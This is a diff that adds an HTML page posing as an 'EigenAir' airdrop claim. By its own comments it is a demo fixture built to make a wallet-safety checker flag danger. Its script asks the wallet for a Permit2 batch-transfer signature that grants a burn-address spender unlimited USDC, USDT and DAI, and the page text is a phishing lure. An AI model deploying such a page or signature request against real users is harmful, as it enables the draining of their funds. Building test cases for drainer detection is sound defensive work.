@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>EigenAir · Claim your airdrop</title>
+<meta property="og:title" content="EigenAir — Claim your airdrop" />
+<meta property="og:site_name" content="EigenAir" />
+<style>
+  :root { color-scheme: light; }
+  body { font-family: system-ui, -apple-system, sans-serif; margin: 0; background: #0f172a; min-height: 100vh; color: #e2e8f0; }
+  main { max-width: 480px; margin: 0 auto; padding: 4rem 1.5rem; }
+  h1 { font-size: 1.85rem; margin: 0 0 0.5rem; letter-spacing: -0.02em; }
+  p.lede { font-size: 1rem; color: #94a3b8; margin-bottom: 2rem; }
+  .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 1.75rem; margin-bottom: 1rem; }
+  .card h2 { margin: 0 0 0.5rem; font-size: 1.05rem; }
+  .reward { font-size: 2rem; font-weight: 700; color: #60a5fa; margin: 0.4rem 0 1.4rem; }
+  button { width: 100%; padding: 0.85rem 1rem; border: 0; border-radius: 8px; background: #3b82f6; color: white; font-weight: 600; font-size: 1rem; cursor: pointer; }
+  button:hover { background: #2563eb; }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  pre.log { text-align: left; font-size: 0.78rem; background: #020617; padding: 0.75rem; border-radius: 6px; max-height: 16em; overflow: auto; margin-top: 1rem; color: #cbd5e1; }
+  .small { font-size: 0.8rem; color: #64748b; }
+</style>
+</head>
+<body>
+<main>
+  <h1>🎉 You qualified!</h1>
+  <p class="lede">Your wallet was selected for the EigenAir restaking incentive drop. Sign once to claim.</p>
+
+  <section class="card">
+    <h2>Available rewards</h2>
+    <p class="reward">12,400 AIR</p>
+    <button id="claim">Sign to claim airdrop</button>
+    <p class="small" style="margin-top: 1rem;">Single signature, no gas required. Enables the claim contract to process your drop.</p>
+  </section>
+
+  <pre id="log" class="log">Console output appears here.</pre>
+</main>
+
+<script>
+// Demo only — pretends to be a friendly airdrop claim. Actually requests an
+// EIP-712 Permit2 PermitBatchTransferFrom signature that authorizes a fake
+// spender ("0xdEaD…") to drain three stablecoins from your wallet via Permit2.
+//
+// Intent Check should fire PERMIT2_SPENDER_UNKNOWN + PERMIT2_BATCH_TRANSFER
+// findings and force DANGER.
+
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const EVIL_SPENDER = "0x000000000000000000000000000000000000dEaD";
+
+// Common stablecoins on Ethereum mainnet — the "valuable" tokens a drainer wants.
+const USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
+const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const DAI  = "0x6b175474e89094c44da98b954eedeac495271d0f";
+
+const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+const log = (msg) => {
+  const el = document.getElementById("log");
+  el.textContent += "\n" + msg;
+  el.scrollTop = el.scrollHeight;
+};
+
+function buildTypedData(chainId) {
+  return {
+    domain: {
+      name: "Permit2",
+      chainId,
+      verifyingContract: PERMIT2,
+    },
+    primaryType: "PermitBatchTransferFrom",
+    types: {
+      EIP712Domain: [
+        { name: "name", type: "string" },
+        { name: "chainId", type: "uint256" },
+        { name: "verifyingContract", type: "address" },
+      ],
+      PermitBatchTransferFrom: [
+        { name: "permitted", type: "TokenPermissions[]" },
+        { name: "spender", type: "address" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" },
+      ],
+      TokenPermissions: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint256" },
+      ],
+    },
+    message: {
+      permitted: [
+        { token: USDC, amount: MAX_UINT },
+        { token: USDT, amount: MAX_UINT },
+        { token: DAI,  amount: MAX_UINT },
+      ],
+      spender: EVIL_SPENDER,
+      nonce: "0",
+      deadline: String(Math.floor(Date.now() / 1000) + 3600),
+    },
+  };
+}
+
+document.getElementById("claim").addEventListener("click", async () => {
+  try {
+    const provider = window.ethereum;
+    if (!provider) {
+      log("✗ No window.ethereum found.");
+      return;
+    }
+    log("→ Connecting wallet…");
+    const accounts = await provider.request({ method: "eth_requestAccounts" });
+    const from = accounts[0];
+    log(`✓ Connected: ${from}`);
+
+    const chainIdHex = await provider.request({ method: "eth_chainId" });
+    const chainId = parseInt(chainIdHex, 16);
+    log(`→ Building Permit2 batch authorization for chain ${chainId}`);
+    const typedData = buildTypedData(chainId);
+    log(`  spender: ${EVIL_SPENDER.slice(0, 10)}…`);
+    log(`  tokens: USDC, USDT, DAI · all unlimited`);
+
+    log("→ Requesting eth_signTypedData_v4 …");
+    const signature = await provider.request({
+      method: "eth_signTypedData_v4",
+      params: [from, JSON.stringify(typedData)],
+    });
+    log(`✓ signature: ${signature.slice(0, 30)}…`);
+    log("(In a real attack the dApp would now POST this signature + execute Permit2 to move all your tokens.)");
+  } catch (e) {
+    log(`✗ ${e.code ?? "?"} ${e.message ?? e}`);
+  }
+});
+</script>
+</body>
+</html>
